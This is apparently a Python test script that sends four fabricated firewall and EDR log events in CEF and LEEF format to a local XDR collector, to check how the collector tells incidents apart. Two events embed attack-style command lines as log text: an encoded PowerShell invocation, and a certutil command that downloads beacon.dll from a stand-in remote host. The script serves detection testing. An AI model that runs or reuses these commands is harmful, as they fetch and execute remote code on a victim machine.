"""P1.10 proof driver — send REAL CEF and LEEF over the live syslog port.

Not a fixture loader: these lines go out on UDP 5514 to the running
`nivxray-xdr-collector`, exactly as a firewall or EDR appliance would
emit them.  Four events with genuinely different evidence so the
incident gate has something real to discriminate on.

    python3 /app/scripts/p1_10_live_proof.py [host] [port]
"""
import socket
import sys
import time

CEF_HIGH = (
    "<14>Jun 10 12:40:11 fw01 CEF:0|Palo Alto Networks|PAN-OS|10.2|4001|"
    "encoded powershell observed|8|src=10.4.9.22 spt=51455 dst=203.0.113.55 "
    "dpt=443 proto=TCP dvchost=HYD-FW01 duser=r.mehta dproc=powershell.exe "
    "dpid=4412 cs1Label=CommandLine "
    "cs1=powershell.exe -enc SQBFAFgAJwBoAHQAdABwAA== act=alert"
)

CEF_INFO = (
    "<14>Jun 10 12:41:02 fw01 CEF:0|Palo Alto Networks|PAN-OS|10.2|4002|"
    "url filtering allow|2|src=10.4.9.90 dst=93.184.216.34 dpt=80 proto=TCP "
    "dvchost=HYD-FW01 duser=a.kumar act=allow"
)

LEEF_MALICIOUS = (
    "<134>Jun 10 12:42:31 srv22 LEEF:2.0|IBM|QRadar EDR|3.1|4711|x09|"
    "cat=process\tdevTime=1780488344000\tsrc=10.4.9.31\tdst=198.51.100.7\t"
    "srcPort=44210\tdstPort=8443\tproto=TCP\tusrName=svc_backup\t"
    "identHostName=HYD-SRV22\tprocessName=certutil.exe\t"
    "cmd=certutil.exe -urlcache -split -f http://198.51.100.7/beacon.dll\tsev=9"
)

LEEF_BENIGN = (
    "<134>Jun 10 12:43:05 srv22 LEEF:1.0|IBM|QRadar EDR|3.1|4712|"
    "cat=process\tdevTime=1780488385000\tusrName=svc_backup\t"
    "identHostName=HYD-SRV22\tprocessName=robocopy.exe\t"
    "cmd=robocopy.exe D:\\\\data E:\\\\backup /MIR\tsev=2"
)

EVENTS = [
    ("CEF  · sev 8 · encoded powershell", CEF_HIGH),
    ("CEF  · sev 2 · url filter allow", CEF_INFO),
    ("LEEF · sev 9 · certutil remote fetch", LEEF_MALICIOUS),
    ("LEEF · sev 2 · robocopy mirror", LEEF_BENIGN),
]


def main() -> None:
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5514
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for label, line in EVENTS:
        sock.sendto(line.encode(), (host, port))
        print(f"sent → {label}")
        time.sleep(0.8)
    print(f"\n{len(EVENTS)} events emitted to {host}:{port}/udp")


if __name__ == "__main__":
    main()
